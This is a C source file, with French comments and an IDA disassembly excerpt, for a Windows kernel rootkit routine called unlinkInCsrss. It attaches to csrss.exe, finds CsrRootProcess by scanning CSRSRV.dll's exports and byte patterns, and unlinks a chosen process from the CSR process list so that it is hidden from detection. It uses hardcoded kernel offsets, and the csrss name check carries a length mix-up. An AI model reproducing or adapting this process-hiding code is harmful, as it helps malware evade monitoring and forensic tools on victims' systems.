/*
.text:75AD52D3                         _CsrLockProcessByClientId@8 proc near   ; CODE XREF: CsrCreateRemoteThread(x,x)+2Fp
.text:75AD52D3
.text:75AD52D3                         arg_0           = dword ptr  8
.text:75AD52D3                         arg_4           = dword ptr  0Ch
.text:75AD52D3
.text:75AD52D3 8B FF                                   mov     edi, edi
.text:75AD52D5 55                                      push    ebp
.text:75AD52D6 8B EC                                   mov     ebp, esp
.text:75AD52D8 53                                      push    ebx
.text:75AD52D9 56                                      push    esi
.text:75AD52DA 57                                      push    edi
.text:75AD52DB BF A0 89 AD 75                          mov     edi, offset _CsrProcessStructureLock
.text:75AD52E0 57                                      push    edi
.text:75AD52E1 FF 15 18 11 AD 75                       call    ds:__imp__RtlEnterCriticalSection@4 ; RtlEnterCriticalSection(x)
.text:75AD52E7 8B 55 0C                                mov     edx, [ebp+arg_4]
.text:75AD52EA 83 22 00                                and     dword ptr [edx], 0
.text:75AD52ED 8B 35 1C 89 AD 75                       mov     esi, _CsrRootProcess <-
.text:75AD52F3 83 C6 08                                add     esi, 8
.text:75AD52F6 C7 45 0C 01 00 00 C0                    mov     [ebp+arg_4], 0C0000001h
.text:75AD52FD 8B CE                                   mov     ecx, esi
*/

int unlinkInCsrss(char* processus)
{
    PEPROCESS                pEprocessCourante;
    PLIST_ENTRY              lcCourante;
    LIST_ENTRY               lEntry;
    ULONG                    valeurDebut;
    KAPC_STATE               kApcState;
    PUCHAR                   pPeb , pPebLdr , pPebLdrEntry , imgBaseCsrsrv , name , CsrLockProcessByClientId , CsrRootProcess;
    PIMAGE_DOS_HEADER        pImgDosHeader;
    PIMAGE_NT_HEADERS        pImgNtHeader;
    PIMAGE_EXPORT_DIRECTORY  pImgExportDirectory;
    PULONG                   rvaNameTable , rvaAdressTable;
    int                     i;
    PCSR_PROCESS            pCsrProcess;

    imgBaseCsrsrv            = NULL;
    CsrLockProcessByClientId = NULL;
    pEprocessCourante        = IoGetCurrentProcess();
    valeurDebut              = (ULONG)pEprocessCourante;
    do
    {
        if(strncmp("csrss.exe" , (PUCHAR)pEprocessCourante + 0x174 , strlen(processus)) == 0)
            break;

        lcCourante = (PLIST_ENTRY)((PUCHAR)pEprocessCourante + 0x88);    //   +0x088 ActiveProcessLinks : _LIST_ENTRY
        pEprocessCourante = (PEPROCESS)((PUCHAR)lcCourante->Flink - 0x88);

    }while((ULONG)pEprocessCourante != valeurDebut);

    if((ULONG)pEprocessCourante == valeurDebut)
            return 0;

    KeStackAttachProcess( (PKPROCESS)pEprocessCourante , &kApcState );

    /* Recherche de l'image base de la dll */

    pPeb    = (PUCHAR)*(PULONG)((PUCHAR)pEprocessCourante + 0x1b0);    //   +0x1b0 Peb              : Ptr32 _PEB
    pPebLdr = (PUCHAR)*(PULONG)(pPeb + 0x00c);                         //   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA

    lcCourante        = (PLIST_ENTRY)(pPebLdr+0x00c);                  //+0x00c InLoadOrderModuleList : _LIST_ENTRY
    pPebLdrEntry      = (PUCHAR)lcCourante->Flink;
    valeurDebut       = (ULONG)pPebLdrEntry;
    lcCourante        = (PLIST_ENTRY)lcCourante->Flink;


    //DbgPrint("EPROCESS: %x , PEB : %x." , pEprocessCourante , pPeb);
    while(valeurDebut != (ULONG)lcCourante->Flink)
    {
        //DbgPrint("Module : %ws." , *(PULONG)(pPebLdrEntry+0x024+0x004) );   //+0x024 FullDllName      : _UNICODE_STRING //   +0x004 Buffer           : Ptr32 Uint2B
        if( wcsstr( (wchar_t*)*(PULONG)(pPebLdrEntry+0x024+0x004) , L"CSRSRV.dll" ) != NULL )
        {
            imgBaseCsrsrv = (PUCHAR)*(PULONG)(pPebLdrEntry + 0x018) ;                   //   +0x018 DllBase          : Ptr32 Void
            break;
        }
        pPebLdrEntry = (PUCHAR)lcCourante->Flink;
        lcCourante   = (PLIST_ENTRY)lcCourante->Flink;
    }
    if(imgBaseCsrsrv == NULL)
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }

    //DbgPrint("Image Base Csrsrv.dll : %x." , imgBaseCsrsrv );

    /*                      */
    /* Parcours de son EAT  */

    pImgDosHeader       = (PIMAGE_DOS_HEADER)imgBaseCsrsrv;
    pImgNtHeader        = (PIMAGE_NT_HEADERS)(imgBaseCsrsrv + pImgDosHeader->e_lfanew);
    pImgExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(imgBaseCsrsrv + pImgNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    rvaNameTable   = (PULONG)(imgBaseCsrsrv + pImgExportDirectory->AddressOfNames);
    rvaAdressTable = (PULONG)(imgBaseCsrsrv + pImgExportDirectory->AddressOfFunctions);

    for( i = 0 ; i < (int)pImgExportDirectory->NumberOfFunctions ; i++)
    {
        //DbgPrint("Fonction : %s." , imgBaseCsrsrv + rvaNameTable[i] );
        if( strcmp("CsrLockProcessByClientId" , imgBaseCsrsrv + rvaNameTable[i]) == 0 )
        {
            CsrLockProcessByClientId = imgBaseCsrsrv + rvaAdressTable[i];
            DbgPrint("CsrLockProcessByClientId : %x." , CsrLockProcessByClientId );
            break;
        }
    }
    if( CsrLockProcessByClientId == NULL )
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }

    /*                      */
    /* Scan de la fonction  */

    for( i = 0 ; i < 50 ; i++ )
    {
        if( (*(CsrLockProcessByClientId+i) == 0x83) && (*(CsrLockProcessByClientId+i+1) == 0x22) && (*(CsrLockProcessByClientId+i+2) == 0x00) && (*(CsrLockProcessByClientId+i+3) == 0x8B) && (*(CsrLockProcessByClientId+i+4) == 0x35) &&
            (*(CsrLockProcessByClientId+i+9) == 0x83) && (*(CsrLockProcessByClientId+i+10) == 0xC6) && (*(CsrLockProcessByClientId+i+11) == 0x08) )
            {
                CsrRootProcess = (PUCHAR)*(PULONG)(*(PULONG)(CsrLockProcessByClientId+i+5));
                break;
            }
    }
    if( i == 50 )
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }

    //DbgPrint("CsrRootProcess : %x." , CsrRootProcess);
    pCsrProcess = (PCSR_PROCESS)CsrRootProcess;

    /*                      */
    /* Recherche d'infos sur leprocess a unlinké */

    pEprocessCourante        = IoGetCurrentProcess();
    valeurDebut              = (ULONG)pEprocessCourante;

    do
    {
        if(strncmp(processus , (PUCHAR)pEprocessCourante + 0x174 , strlen(processus)) == 0)
            break;

        lcCourante = (PLIST_ENTRY)((PUCHAR)pEprocessCourante + 0x88);    //   +0x088 ActiveProcessLinks : _LIST_ENTRY
        pEprocessCourante = (PEPROCESS)((PUCHAR)lcCourante->Flink - 0x88);

    }while((ULONG)pEprocessCourante != valeurDebut);

    if((ULONG)pEprocessCourante == valeurDebut)
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }

    /*                      */

    i = 0;

    /* Parcours de la liste */

    lEntry  = pCsrProcess->ListLink;
    valeurDebut = (ULONG)pCsrProcess;
    //DbgPrint("PID : %d." , pCsrProcess->ClientId.UniqueProcess);
    pCsrProcess = (PCSR_PROCESS)((PUCHAR)lEntry.Flink - 0x8);


    while(valeurDebut != (ULONG)pCsrProcess)
    {
        //DbgPrint("PID(%d) : %d." , *(PULONG)((PUCHAR)pEprocessCourante + 0x084) , pCsrProcess->ClientId.UniqueProcess);
        if( (ULONG)pCsrProcess->ClientId.UniqueProcess == *(PULONG)((PUCHAR)pEprocessCourante + 0x084) ) //   +0x084 UniqueProcessId  : Ptr32 Void
        {
            *(PULONG)(pCsrProcess->ListLink.Blink)             =(ULONG) pCsrProcess->ListLink.Flink;
            *(PULONG)((PUCHAR)pCsrProcess->ListLink.Flink + 4) = (ULONG)pCsrProcess->ListLink.Blink;
            i = 1;
        }

        lEntry = *(lEntry.Flink);
        pCsrProcess = (PCSR_PROCESS)((PUCHAR)lEntry.Flink - 0x8);
    }
    if( i == 0 )
    {
        KeUnstackDetachProcess( &kApcState );
        return 0;
    }


    //DbgPrint("Unlink Done.");

    /*                      */

    KeUnstackDetachProcess( &kApcState );
    return 1;
}
